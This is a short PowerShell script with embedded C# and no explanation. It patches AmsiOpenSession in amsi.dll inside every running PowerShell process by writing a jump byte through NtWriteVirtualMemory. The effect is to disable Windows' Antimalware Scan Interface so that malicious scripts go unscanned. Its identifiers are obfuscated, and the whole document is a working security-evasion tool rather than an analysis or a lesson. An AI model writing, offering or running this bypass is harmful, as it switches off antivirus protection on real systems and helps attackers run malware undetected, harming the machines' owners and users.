$null=Read-Host ""
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class T {
    public const int A=0x8,B=0x10,C=0x20;
    public const uint D=0x40;
    [DllImport("ntdll.dll")] public static extern int NtOpenProcess(out IntPtr h,uint a,ref G b,ref I c);
    [DllImport("ntdll.dll")] public static extern int NtWriteVirtualMemory(IntPtr h,IntPtr a,byte[] b,uint c,out uint d);
    [DllImport("ntdll.dll")] public static extern int NtClose(IntPtr h);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr LoadLibrary(string s);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr GetProcAddress(IntPtr h,string s);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern bool VirtualProtectEx(IntPtr h,IntPtr a,UIntPtr b,uint c,out uint d);
    [StructLayout(LayoutKind.Sequential)] public struct G {
        public int L;
        public IntPtr R1,R2,R3;
        public IntPtr S1,S2;
    }
    [StructLayout(LayoutKind.Sequential)] public struct I {
        public IntPtr U1,U2;
    }
}
"@
function p{param([int]$x)
$b=[byte]0xEB;$o=New-Object T+G;$c=New-Object T+I
$c.U1=[IntPtr]$x;$c.U2=[IntPtr]::Zero
$o.L=[Runtime.InteropServices.Marshal]::SizeOf($o)
$h=[IntPtr]::Zero
$d=[T]::NtOpenProcess([ref]$h,[T]::A -bor [T]::B -bor [T]::C,[ref]$o,[ref]$c)
if($d -ne 0){return}
$m=[T]::LoadLibrary("amsi.dll")
if($m -eq [IntPtr]::Zero){[T]::NtClose($h);return}
$a=[T]::GetProcAddress($m,"AmsiOpenSession")
if($a -eq [IntPtr]::Zero){[T]::NtClose($h);return}
$p=[IntPtr]($a.ToInt64()+3)
$g=[UInt32]0
$s=[UIntPtr]::new(1)
$v=[T]::VirtualProtectEx($h,$p,$s,[T]::D,[ref]$g)
if(-not $v){[T]::NtClose($h);return}
$r=[UInt32]0
[T]::NtWriteVirtualMemory($h,$p,[byte[]]@($b),1,[ref]$r)
[T]::VirtualProtectEx($h,$p,$s,$g,[ref]$g)
[T]::NtClose($h)
}
function q{Get-Process | ? { $_.ProcessName -eq "powershell" } | % { p -x $_.Id }}
q
